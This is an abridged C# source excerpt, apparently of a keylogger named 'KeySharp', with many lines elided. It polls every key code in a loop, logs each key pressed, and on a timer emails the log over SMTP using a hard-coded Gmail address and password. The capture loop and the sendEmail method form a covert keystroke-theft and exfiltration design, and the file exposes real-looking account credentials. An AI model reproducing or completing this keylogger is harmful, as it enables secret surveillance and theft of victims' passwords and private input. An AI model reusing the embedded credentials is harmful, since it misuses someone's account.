...
namespace KeySharp
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            Console.WriteLine($"LOG PATH => {new Program().path}");
            ...
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    ...
                    if (key == 1 || key == -32767)
                    {
                        ...
                        Console.Write($"VerifyKey: {verifyKey(i)}");
        ...
        private String verifyKey(int code)
        {
            ...
            Console.WriteLine($"Code: {code} => Key: {key}");
            return key;
        }
        ...
        private void sendEmail(Object source, ElapsedEventArgs e)
        {
            try
            {
                ...
                server.Port = 587;
                server.Credentials = new NetworkCredential("faitholusegun60@gmail.com", "s3curify2020mniF487#/");
